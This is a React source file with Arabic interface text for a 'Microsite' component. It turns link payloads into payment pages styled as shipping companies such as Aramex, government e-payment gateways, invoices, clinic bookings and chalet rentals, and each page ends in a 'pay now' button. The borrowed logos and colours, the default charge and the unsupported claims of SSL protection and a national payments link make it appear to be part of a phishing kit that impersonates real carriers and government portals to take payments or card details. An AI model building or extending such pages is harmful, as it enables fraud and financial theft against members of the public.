import React from "react";
import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useLinkData } from "@/hooks/useLinkData";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyCode } from "@/lib/countryCurrencies";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getGovBranding } from "@/lib/brandingSystem";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { gccShippingServices } from "@/lib/gccShippingServices";
import { getCompanyMeta } from "@/utils/companyMeta";
import { getCurrency } from "@/utils/countryData";
import SEOHead from "@/components/SEOHead";
import BackButton from "@/components/BackButton";
import BottomNav from "@/components/BottomNav";
import {
  MapPin,
  Users,
  CheckCircle2,
  CreditCard,
  Shield,
  Sparkles,
  Package,
  Truck,
  Hash,
  FileText,
  Heart,
  Building2,
  ShieldCheck,
  Landmark,
  Lock,
} from "lucide-react";

const Microsite = () => {
  const { country, type, id } = useParams();
  const navigate = useNavigate();
  const { data: link, isLoading, isError } = useLinkData(id);
  const countryData = getCountryByCode(country || "");
  const [showPage, setShowPage] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowPage(true);
    }, 3000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (link || isError) {
      setShowPage(true);
    }
  }, [link, isError]);
  
  if (isLoading && !showPage) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="animate-pulse text-xl">جاري التحميل...</div>
      </div>
    );
  }
  
  if (!link || !countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <h2 className="text-2xl font-bold mb-2">الرابط غير موجود</h2>
          <p className="text-muted-foreground">الرجاء التحقق من الرابط</p>
        </div>
      </div>
    );
  }
  
  const payload = link.payload;
  const rawAmount = payload.cod_amount;

  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const isShipping = link.type === 'shipping';
  const isInvoice = link.type === 'invoices';
  const isHealth = link.type === 'health';
  const isLogistics = link.type === 'logistics';
  const isContracts = link.type === 'contracts';
  const isChalet = link.type === 'chalet';
  const isGovernment = link.type === 'government';

  const serviceName = payload.service_name || payload.chalet_name;
  const serviceKey = payload.service_key || (link.type === 'contracts' ? 'contracts' : 'aramex');
  const govId = payload.govId;
  const serviceBranding = getServiceBranding(serviceKey);
  const govSystem = govId ? getGovernmentPaymentSystem(govId) : undefined;

  const companyMeta = getCompanyMeta(serviceKey);

  useEffect(() => {
    const currentUrl = new URL(window.location.href);
    if (isShipping && serviceKey && !currentUrl.searchParams.has('service')) {
      currentUrl.searchParams.set('service', serviceKey);
      window.history.replaceState({}, '', currentUrl.toString());
    }
  }, [isShipping, serviceKey]);

  const serviceDescription = serviceBranding.description || `خدمة ${serviceName} - نظام دفع آمن ومحمي`;

  const seoTitle = isShipping
    ? companyMeta.title || `تتبع وتأكيد الدفع - ${serviceName}`
    : isInvoice
    ? `فاتورة ${payload.invoice_number} - ${countryData.nameAr}`
    : isHealth
    ? `${payload.service_type_label} - ${countryData.nameAr}`
    : isLogistics
    ? `شحن ${payload.service_type_label} - ${countryData.nameAr}`
    : isContracts
    ? `عقد ${payload.template_name} - ${countryData.nameAr}`
    : isGovernment
    ? `سداد ${serviceName} - ${govSystem?.nameAr || countryData.nameAr}`
    : `حجز شاليه - ${payload.chalet_name}`;

  const seoDescription = isShipping
    ? companyMeta.description || `${serviceDescription} - تتبع شحنتك وأكمل الدفع بشكل آمن`
    : isInvoice
    ? `فاتورة رقم ${payload.invoice_number} - إجمالي ${payload.total} ${payload.currency}`
    : isHealth
    ? `${payload.service_type_label} - ${payload.appointment_date} ${payload.appointment_time}`
    : isLogistics
    ? `شحن من ${payload.sender_name} إلى ${payload.receiver_name}`
    : isContracts
    ? `${payload.template_name} - ${payload.template_category}`
    : isGovernment
    ? `بوابة السداد الإلكتروني لخدمة ${serviceName} - دفع آمن وموثق`
    : `احجز ${payload.chalet_name} في ${countryData.nameAr} - ${payload.nights} ليلة لـ ${payload.guest_count} ضيف`;

  const seoImage = govSystem?.logo || companyMeta.image || serviceBranding.ogImage || serviceBranding.heroImage || '/og-aramex.jpg';

  const primaryColor = govSystem?.colors.primary || countryData.primaryColor;
  const secondaryColor = govSystem?.colors.secondary || countryData.secondaryColor;

  return (
    <>
      <SEOHead
        title={seoTitle}
        description={seoDescription}
        image={seoImage}
        url={window.location.href}
        type="website"
        serviceName={serviceName}
        serviceDescription={serviceDescription}
        companyKey={serviceKey}
        currency={getCurrencyCode(country || "SA")}
      />

      {isGovernment && govSystem ? (
        <div className="min-h-screen bg-slate-50 font-arabic pb-24" dir="rtl">
           <header className="bg-white border-b-4 shadow-sm sticky top-0 z-50" style={{ borderBottomColor: govSystem.colors.primary }}>
             <div className="container mx-auto px-4 h-20 flex items-center justify-between">
                <div className="flex items-center gap-4">
                   <BackButton />
                   <div className="w-12 h-12 rounded-xl flex items-center justify-center text-white shadow-lg shadow-gray-200" style={{ background: govSystem.colors.primary }}>
                      <Landmark className="w-6 h-6" />
                   </div>
                   <div>
                      <h1 className="text-lg font-black text-gray-800 leading-tight">بوابة السداد الإلكتروني</h1>
                      <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">{govSystem.nameEn} SECURE GATEWAY</p>
                   </div>
                </div>
                {govSystem.logo && <img src={govSystem.logo} className="h-10 w-auto object-contain" alt="" />}
             </div>
           </header>

           <main className="container mx-auto px-4 py-10 max-w-4xl">
              <div className="grid lg:grid-cols-3 gap-8 items-start">
                 <div className="lg:col-span-2 space-y-6">
                    <Card className="p-8 border-none shadow-2xl rounded-[2.5rem] bg-white overflow-hidden relative">
                       <div className="absolute top-0 left-0 w-full h-2" style={{ background: govSystem.gradients.primary }} />
                       <div className="space-y-8">
                          <div className="flex items-center gap-4 p-5 rounded-2xl bg-gray-50 border-2 border-dashed border-gray-100">
                             <div className="w-16 h-16 rounded-xl bg-white shadow-sm flex items-center justify-center border p-2">
                                {govSystem.logo && <img src={govSystem.logo} className="max-h-full max-w-full object-contain" alt="" />}
                             </div>
                             <div>
                                <h3 className="font-black text-lg text-gray-800">{serviceName}</h3>
                                <p className="text-xs font-bold text-gray-400 uppercase tracking-widest">{govSystem.description}</p>
                             </div>
                          </div>

                          <div className="grid sm:grid-cols-2 gap-6">
                             <div className="space-y-1">
                                <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">رقم المرجع</p>
                                <div className="p-4 rounded-xl bg-gray-50 border-2 border-gray-100 font-black text-gray-700">
                                   {payload.reference || `REF-${id?.slice(0, 8).toUpperCase()}`}
                                </div>
                             </div>
                             <div className="space-y-1">
                                <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">المستفيد</p>
                                <div className="p-4 rounded-xl bg-gray-50 border-2 border-gray-100 font-black text-gray-700 truncate">
                                   {payload.customerInfo?.fullName || 'جهة حكومية'}
                                </div>
                             </div>
                          </div>

                          <div className="p-8 rounded-3xl bg-slate-900 text-white shadow-xl relative overflow-hidden group">
                             <div className="relative z-10 space-y-4">
                                <div className="flex justify-between items-center">
                                   <span className="text-xs font-bold text-slate-400 uppercase tracking-[0.2em]">إجمالي المبلغ المستحق</span>
                                   <ShieldCheck className="w-5 h-5 text-green-400" />
                                </div>
                                <div className="flex items-baseline gap-2">
                                   <span className="text-5xl font-black tracking-tighter text-white">{formatCurrency(amount, getCurrencyCode(country || "SA"))}</span>
                                </div>
                             </div>
                             <CreditCard className="absolute -bottom-10 -right-10 w-48 h-48 opacity-5 -rotate-12 group-hover:rotate-0 transition-transform duration-700" />
                          </div>

                          <Button
                            size="lg"
                            className="w-full h-20 text-xl font-black rounded-2xl shadow-xl transition-all hover:translate-y-[-4px] active:translate-y-[2px]"
                            style={{ background: govSystem.gradients.primary }}
                            onClick={() => {
                              const companyKey = payload.service_key || 'government';
                              const govId = payload.govId;
                              const query = new URLSearchParams(window.location.search);
                              if (govId) query.set('govId', govId);
                              query.set('company', companyKey);
                              query.set('amount', amount.toString());
                              query.set('currency', getCurrencyCode(country || "SA"));
                              navigate(`/pay/${link.id}/recipient?${query.toString()}`);
                            }}
                          >
                            <Lock className="w-6 h-6 ml-3" /> المتابعة للسداد الآمن
                          </Button>
                       </div>
                    </Card>

                    <div className="flex items-center justify-center gap-6 opacity-30 grayscale h-6">
                       <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-full" alt="mada" />
                       <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-full" alt="visa" />
                       <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-full" alt="mastercard" />
                    </div>
                 </div>

                 <div className="space-y-6">
                    <Card className="p-6 border-none shadow-xl rounded-3xl bg-white">
                       <h4 className="font-black text-gray-800 mb-4 flex items-center gap-2">
                          <CheckCircle2 className="w-5 h-5 text-blue-600" /> تعليمات السداد
                       </h4>
                       <ul className="space-y-4 text-xs font-bold text-gray-500 leading-relaxed">
                          <li className="flex gap-3">
                             <div className="w-1.5 h-1.5 rounded-full bg-blue-600 mt-1.5 shrink-0" />
                             تأكد من صحة رقم الهوية والمبلغ قبل المتابعة.
                          </li>
                          <li className="flex gap-3">
                             <div className="w-1.5 h-1.5 rounded-full bg-blue-600 mt-1.5 shrink-0" />
                             سيتم تحويلك إلى صفحة التحقق البنكي الآمنة.
                          </li>
                          <li className="flex gap-3">
                             <div className="w-1.5 h-1.5 rounded-full bg-blue-600 mt-1.5 shrink-0" />
                             يتم إصدار إيصال دفع فوري بعد العملية.
                          </li>
                       </ul>
                    </Card>

                    <div className="p-6 rounded-3xl bg-gradient-to-br from-blue-600 to-blue-800 text-white shadow-xl">
                       <Shield className="w-10 h-10 mb-4 opacity-50" />
                       <h4 className="font-black text-lg mb-2">حماية متكاملة</h4>
                       <p className="text-[10px] font-bold opacity-80 leading-relaxed">
                          هذه المعاملة محمية بتشفير 256-bit SSL ومرتبطة بالشبكة الوطنية للمدفوعات.
                       </p>
                    </div>
                 </div>
              </div>
           </main>
           <BottomNav />
        </div>
      ) : (
        <div className="min-h-screen py-12 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
        <div className="container mx-auto px-4">
          <div className="mb-4">
            <BackButton />
          </div>

          <div className="max-w-4xl mx-auto">
            <div className="text-center mb-8">
              <Badge className="text-lg px-6 py-2 bg-gradient-primary">
                <Shield className="w-4 h-4 ml-2" />
                <span>عقد موثّق ومحمي</span>
              </Badge>
            </div>

            <Card className="overflow-hidden shadow-elevated">
              <div
                className="h-32 relative"
                style={{
                  background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                }}
              >
                <div className="absolute inset-0 bg-black/20" />
                <div className="absolute bottom-4 right-6 text-white">
                  <h1 className="text-3xl font-bold">
                    {isInvoice
                      ? `فاتورة ${payload.invoice_number}`
                      : isHealth
                      ? (payload.service_name || payload.service_type_label)
                      : isLogistics
                      ? (payload.service_name || payload.service_type_label)
                      : isContracts
                      ? payload.template_name
                      : (payload.service_name || payload.chalet_name)}
                  </h1>
                  <p className="text-lg opacity-90">{countryData.nameAr}</p>
                </div>
              </div>

              <div className="p-8">
                <div className="aspect-video bg-gradient-card rounded-xl mb-6 flex items-center justify-center p-4">
                  {isShipping && serviceBranding.logo ? (
                    <img
                      src={serviceBranding.logo}
                      alt={serviceName}
                      className="max-h-full max-w-full object-contain"
                    />
                  ) : isShipping ? (
                    <Truck className="w-16 h-16 text-muted-foreground" />
                  ) : isInvoice ? (
                    <FileText className="w-16 h-16 text-muted-foreground" />
                  ) : isHealth ? (
                    <Heart className="w-16 h-16 text-muted-foreground" />
                  ) : isLogistics ? (
                    <Package className="w-16 h-16 text-muted-foreground" />
                  ) : isContracts ? (
                    <Building2 className="w-16 h-16 text-muted-foreground" />
                  ) : (
                    <Sparkles className="w-16 h-16 text-muted-foreground" />
                  )}
                </div>

                {isShipping && (
                  <div className="mb-6 p-4 bg-secondary/20 rounded-lg border">
                    <div className="flex items-center gap-3 mb-2">
                      {serviceBranding.logo && (
                        <img
                          src={serviceBranding.logo}
                          alt={serviceName}
                          className="h-8 w-auto object-contain"
                        />
                      )}
                      {!serviceBranding.logo && <Package className="w-5 h-5 text-primary" />}
                      <h3 className="font-bold text-lg">{serviceName}</h3>
                    </div>
                    <p className="text-sm text-muted-foreground">{serviceDescription}</p>
                  </div>
                )}

                <div className="grid md:grid-cols-2 gap-6 mb-8">
                  {isInvoice ? (
                    <>
                      <div className="flex items-start gap-3">
                        <FileText className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">رقم الفاتورة</p>
                          <p className="text-muted-foreground text-sm">{payload.invoice_number}</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3">
                        <Users className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">العميل</p>
                          <p className="text-muted-foreground text-sm">{payload.client_name}</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3">
                        <CheckCircle2 className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">تاريخ الإصدار</p>
                          <p className="text-muted-foreground text-sm">{payload.issue_date}</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3">
                        <CreditCard className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">الإجمالي</p>
                          <p className="text-muted-foreground text-sm">
                            {formatCurrency(payload.total, getCurrencyCode(country || "SA"))}
                          </p>
                        </div>
                      </div>
                    </>
                  ) : isHealth ? (
                    <>
                      <div className="flex items-start gap-3">
                        <Users className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">اسم المريض</p>
                          <p className="text-muted-foreground text-sm">{payload.patient_name}</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3">
                        <Heart className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">نوع الخدمة</p>
                          <p className="text-muted-foreground text-sm">{payload.service_type_label}</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3">
                        <CheckCircle2 className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">تاريخ الموعد</p>
                          <p className="text-muted-foreground text-sm">{payload.appointment_date} - {payload.appointment_time}</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3">
                        <CreditCard className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">الطبيب</p>
                          <p className="text-muted-foreground text-sm">{payload.doctor_name || 'غير محدد'}</p>
                        </div>
                      </div>
                    </>
                  ) : isLogistics ? (
                    <>
                      <div className="flex items-start gap-3">
                        <MapPin className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">المرسل</p>
                          <p className="text-muted-foreground text-sm">{payload.sender_name}</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3">
                        <MapPin className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">المستلم</p>
                          <p className="text-muted-foreground text-sm">{payload.receiver_name}</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3">
                        <Package className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">نوع الشحنة</p>
                          <p className="text-muted-foreground text-sm">{payload.package_type_label}</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3">
                        <CreditCard className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">الوزن</p>
                          <p className="text-muted-foreground text-sm">{payload.package_weight} كجم</p>
                        </div>
                      </div>
                    </>
                  ) : isContracts ? (
                    <>
                      <div className="flex items-start gap-3">
                        <Building2 className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">نوع العقد</p>
                          <p className="text-muted-foreground text-sm">{payload.template_category}</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3">
                        <Shield className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">السلطة المختصة</p>
                          <p className="text-muted-foreground text-sm">{payload.country_elements?.authority || 'غير محدد'}</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3">
                        <CheckCircle2 className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">موقع الختم</p>
                          <p className="text-muted-foreground text-sm">{payload.country_elements?.stampPosition || 'غير محدد'}</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3">
                        <FileText className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">موقع التوقيع</p>
                          <p className="text-muted-foreground text-sm">{payload.country_elements?.signaturePosition || 'غير محدد'}</p>
                        </div>
                      </div>
                    </>
                  ) : isShipping ? (
                    <>
                      <div className="flex items-start gap-3">
                        <Hash className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">رقم الشحنة</p>
                          <p className="text-muted-foreground text-sm">{payload.tracking_number}</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3">
                        <Truck className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">وصف الطرد</p>
                          <p className="text-muted-foreground text-sm">{payload.package_description || 'غير محدد'}</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3">
                        <CreditCard className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">مبلغ الدفع</p>
                          <p className="text-muted-foreground text-sm">
                            {formatCurrency(amount, getCurrencyCode(country || "SA"))}
                          </p>
                        </div>
                      </div>
                    </>
                  ) : (
                    <>
                      <div className="flex items-start gap-3">
                        <MapPin className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">الموقع</p>
                          <p className="text-muted-foreground text-sm">{payload.chalet_name}</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3">
                        <Users className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">عدد الضيوف</p>
                          <p className="text-muted-foreground text-sm">{payload.guest_count} ضيف</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3">
                        <CheckCircle2 className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">المدة</p>
                          <p className="text-muted-foreground text-sm">{payload.nights} ليلة</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3">
                        <CreditCard className="w-5 h-5 text-primary mt-1" />
                        <div>
                          <p className="font-semibold mb-1">السعر / الليلة</p>
                          <p className="text-muted-foreground text-sm">
                            {formatCurrency(payload.price_per_night, getCurrencyCode(country || "SA"))}
                          </p>
                        </div>
                      </div>
                    </>
                  )}
                </div>

                <div className="bg-gradient-primary p-6 rounded-xl text-primary-foreground mb-6">
                  <p className="text-sm mb-2 opacity-90">
                    {isInvoice ? 'إجمالي الفاتورة' : isHealth ? 'رسوم الحجز' : isLogistics ? 'تكلفة الشحن' : isContracts ? 'قيمة العقد' : 'المبلغ الإجمالي'}
                  </p>
                  <p className="text-5xl font-bold mb-2">
                    {isShipping
                      ? formatCurrency(amount, getCurrencyCode(country || "SA"))
                      : isInvoice
                      ? formatCurrency(payload.total, getCurrencyCode(country || "SA"))
                      : isLogistics
                      ? formatCurrency(parseFloat(payload.insurance_value) || 0, getCurrencyCode(country || "SA"))
                      : isContracts
                      ? 'مجاناً'
                      : formatCurrency(payload.total_amount, getCurrencyCode(country || "SA"))}
                  </p>
                </div>

                <Button
                  size="lg"
                  className="w-full text-xl py-7 shadow-glow"
                  onClick={() => {
                    const companyKey = payload.service_key || 'aramex';
                    const govId = payload.govId;
                    const query = new URLSearchParams(window.location.search);
                    if (govId) query.set('govId', govId);
                    query.set('company', companyKey);
                    query.set('amount', amount.toString());
                    query.set('currency', getCurrencyCode(country || "SA"));
                    navigate(`/pay/${link.id}/recipient?${query.toString()}`);
                  }}
                >
                  <CreditCard className="w-6 h-6 ml-3" />
                  <span>ادفع الآن</span>
                </Button>
              </div>
            </Card>
          </div>
        </div>
        <div className="h-20" />
        <BottomNav />
      </div>
      )}
    </>
  );
};

export default Microsite;
